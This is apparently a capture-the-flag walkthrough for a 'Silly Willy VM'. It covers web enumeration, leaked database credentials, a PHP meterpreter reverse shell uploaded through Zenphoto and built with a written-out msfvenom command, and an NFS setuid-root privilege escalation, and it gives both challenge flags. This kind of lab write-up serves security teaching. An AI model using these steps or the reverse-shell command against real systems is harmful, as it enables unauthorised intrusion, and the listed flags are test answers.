# Silly Willy VM (Hard Difficulty)

This directory consists of challenges related to `Silly Willy VM`.

Author: Joe and Xiaozhi

## Silly Willy VM writeup 
Orcus walkthrough
1.	Nmap –sn to find the ip address. You can use nmap –sV to find the services open.
 
 
Port 80 is open so we see what it's about. 
 
2.	Run dirb on it to see what other directories it has.
 

3.	Notice that there is a /admin and a /backups. Lets view /admin. There isnt anything in the webpage but when we inspect element, we see a commented line leading us to /backups.
 
4.	Lets view /backups now. We can try downloading these to see what it is.
 
 
 
5.	Inside SimplePHPQuiz, there is a lot of folders and php files. We will now explore these and after awhile, you’ll find that you can get the database credentials in includes folder > db_conn.php. 
 
6.	Inside SimplePHPQuiz, there is a lot of folders and php files. We will now explore these and after awhile, you’ll find that you can get the database credentials in includes folder > db_conn.php.
7.	The credentials are dbuser and dbpassword.
 
8.	We can try uploading a php shell into the web root. This error thrown tells you this parameter (-- secure-file-priv) limits the effects of data import and export operations and only permit it to users who have the FILE privilege. 
 
9.	In dirb, we also saw another interesting directory called zenphoto. Let's visit that.
 
10.	Zenphoto is a content management system and we can set it up for exploitation. We will use the same credentials as above (dbuser, dbpassword)
 

11.	We now need to create a user to login to the admin panel. I will user credentials as follows:
12.	Username – user1
13.	Password – P@ssw0rd1
 

14.	After we have logged in, we can now upload files for exploitation. Let’s use msfvenom to create a reverse shell. 
 
15.	Command used: msfvenom -p php/meterpreter/reverse_tcp LHOST=(host ip) LPORT=4444 -f raw > shell.php
16.	The upload only accepts zip files, so we need to package it as a zip. Afterwards we can upload the file. 
 
 
 
17.	Now, we are ready for exploitation. First set up handler before running the shell. Use msfconsole.
 
18.	Now execute shell.php. This will return a meterpreter on your msfconsole.
 
 
19.	After searching a while, you will find a flag.txt in /var/www. Cat it and you will get the flag. 
20.	Flag 1/ User flag: 868c889965b7ada547fae81f922e45c4
 
 

21.	Now we need to perform privilege escalations. After navigating abit, we find something very interesting in /etc.
 
22.	Kippo is running on the machine, which means there could be credentials on it. (Kippo: an SSH honeypot service)
 
23.	We saw earlier that rpc is enabled, so lets run rpcinfo on the ip to see what it returns. We can see that nfs is enabled and we can see the mounts that are exported by the machine.
 
24.	Since Nfs is enabled, we will check for what mounts are exported by the machine. 	
 
25.	Checked the nfs config
 
26.	Created a program using nano called root_shell.c to set uid and gid and execute /bin/bash to /tmp/shell.c
 
27.	Went to /tmp and uploaded the root_shell.c file
 
28.	Went into shell and spawned python shell
 
29.	Compiled the shell.c program
 
30.	In kali machine, made a directory for /tmp/nfs and mounted it to target machine.
 
31.	Assigned root privileges to root_shell
 
32.	Get root flag from target machine 807307b49314f822985d0410de7d8bfe
 


